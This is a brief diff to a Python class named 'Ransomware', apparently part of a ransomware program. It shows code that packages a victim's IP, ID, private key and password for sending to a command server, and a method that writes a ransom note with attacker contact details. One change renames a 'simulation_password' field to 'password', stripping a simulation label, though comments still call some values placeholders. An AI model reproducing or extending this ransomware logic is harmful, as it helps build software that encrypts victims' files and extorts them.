@@ -205,7 +205,7 @@ class Ransomware:
                     'victim_ip': self.ip_address if self.ip_address else 'unknown',
                     'victim_id': self.victim_id if self.victim_id else 'unknown',
                     'private_key_data': private_key_pem,
-                    'simulation_password': self.password if self.password else 'unknown_password'
+                    'password': self.password if self.password else 'unknown_password'
                 }
                 
                 logger.info(f"Attempting to send private key to server '{SERVER_URL}'...")
@@ -361,7 +361,7 @@ class Ransomware:
         """Creates a ransom note to inform the user about the encryption and recovery instructions."""
         ransom_note_path = os.path.join(self.target_directory, RANSOM_NOTE_FILENAME)
 
-         # --- Dynamic content for the ransom note ---
+        # --- Dynamic content for the ransom note ---
         # These values are for simulation purposes.
         # In a real scenario, these would be controlled by the attacker.
         attacker_email = "Example email address" # Example email address
